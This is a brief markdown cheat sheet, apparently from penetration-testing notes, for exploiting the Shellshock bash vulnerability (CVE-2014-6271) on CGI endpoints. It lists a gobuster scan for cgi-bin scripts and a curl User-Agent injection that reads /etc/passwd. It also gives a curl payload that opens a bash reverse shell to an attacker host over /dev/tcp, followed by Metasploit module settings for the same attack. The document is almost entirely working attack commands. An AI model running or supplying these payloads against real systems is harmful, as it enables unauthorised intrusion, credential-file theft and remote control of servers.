## <span style="color:#8BE9FD">Shellshock (CVE-2014-6271)</span>
- Find CGI Scripts `gobuster dir -u http://$VICTIM_IP/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x cgi,sh,pl`
- Vulnerability Confirmation `curl -H "User-Agent: () { :; }; echo; echo; /bin/cat /etc/passwd" http://$VICTIM_IP/cgi-bin/status.cgi`
- Trigger Reverse Shell `curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1" http://$VICTIM_IP/cgi-bin/status.cgi`

#### <span style="color:#FFB86C">msfconsole</span>
```bash
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS $VICTIM_IP
set TARGETURI /cgi-bin/status.cgi
set LHOST $ATTACKER_IP
exploit
```